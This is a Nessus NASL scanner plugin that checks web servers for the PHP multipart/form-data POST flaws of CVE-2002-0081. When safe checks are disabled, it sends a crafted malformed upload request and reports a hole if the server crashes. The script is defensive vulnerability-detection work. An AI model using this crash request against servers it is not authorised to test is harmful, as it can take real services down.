#
# This script was written by Thomas Reinke <reinke@securityspace.com>
#
# Modified by H D Moore & Renaud Deraison to actually test for the flaw
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10867);
 script_bugtraq_id(4183);
 script_cve_id("CVE-2002-0081");
 script_version("$Revision: 1.22 $");
 
 name["english"] = "php POST file uploads";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of PHP earlier
than 4.1.2.

There are several flaws in how PHP handles
multipart/form-data POST requests, any one of which can
allow an attacker to gain remote access to the system.

Solution : Upgrade to PHP 4.1.2
Risk factor : High";




 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for version of PHP";
 summary["francais"] = "Vérifie la version de PHP";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Thomas Reinke",
		francais:"Ce script est Copyright (C) 2001 Thomas Reinke");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("backport.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner)exit(0);
php = get_php_version(banner:banner);
if ( ! php ) exit(0);

if(http_is_dead(port:port))exit(0);

if(get_port_state(port))
{
 if ( ! can_host_php(port:port) ) exit(0);

 if(!safe_checks())
 {
  files = get_kb_list(string("www/", port, "/content/extensions/php*"));
 
  if(isnull(files))file = "/default.php";
  else {
  	files = make_list(files);
	file = files[0];
	}
  
  if(is_cgi_installed_ka(item:file, port:port))
  {
   boundary1 = string("-NESSUS!");
   boundary2 = string("--NESSUS!");
   clen = "567";
   dblq = raw_string(0x22);
   badb = raw_string(0x12);


   postdata = string("POST ", file, " HTTP/1.1\r\n", "Host: ", get_host_name(), "\r\n");
   postdata = string(postdata, "Referer: http://", get_host_name(), "/", file, "\r\n");
   postdata = string(postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\r\n");
   postdata = string(postdata, "Content-Length: ", clen, "\r\n\r\n", boundary2, "\r\n");
   postdata = string(postdata, "Content-Disposition: form-data; name=");
  


  len = strlen(dblq) + strlen(badb) + strlen(dblq);
  big = crap(clen - len);
  postdata = string(postdata, dblq, badb, dblq, big, dblq);
 
  soc = http_open_socket(port);
  if(!soc)exit(0);
 
  send(socket:soc, data:postdata);
  
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(http_is_dead(port: port)) { security_hole(port); }
  }
 }
}